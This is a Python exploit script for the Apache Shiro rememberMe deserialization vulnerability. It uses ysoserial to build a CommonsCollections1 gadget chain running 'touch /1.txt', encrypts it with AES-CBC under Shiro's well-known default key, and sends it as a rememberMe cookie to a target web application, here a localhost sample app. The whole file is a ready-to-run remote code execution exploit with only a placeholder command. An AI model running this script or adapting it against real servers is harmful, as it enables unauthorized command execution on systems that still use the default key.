#!/usr/bin/env python3
# coding:utf-8

from Crypto.Cipher import AES
import traceback
import requests
import subprocess
import uuid
import base64

target = "http://localhost:8080/samples_web_war/"
jar_file = 'F:\\Penetration\\ysoserial\\ysoserial-0.0.6-SNAPSHOT-all.jar'
cipher_key = "kPH+bIxk5D2deZiIxcaaaA=="

# 创建 rememberme的值
popen = subprocess.Popen(['java','-jar',jar_file, "CommonsCollections1",  "touch /1.txt"],
                        stdout=subprocess.PIPE)
BS = AES.block_size
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
mode = AES.MODE_CBC
iv = uuid.uuid4().bytes
encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)
file_body = pad(popen.stdout.read())
base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))

# 发送request
try:
    r = requests.get(target, cookies={'rememberMe':base64_ciphertext.decode()}, timeout=10)
except:
    traceback.print_exc()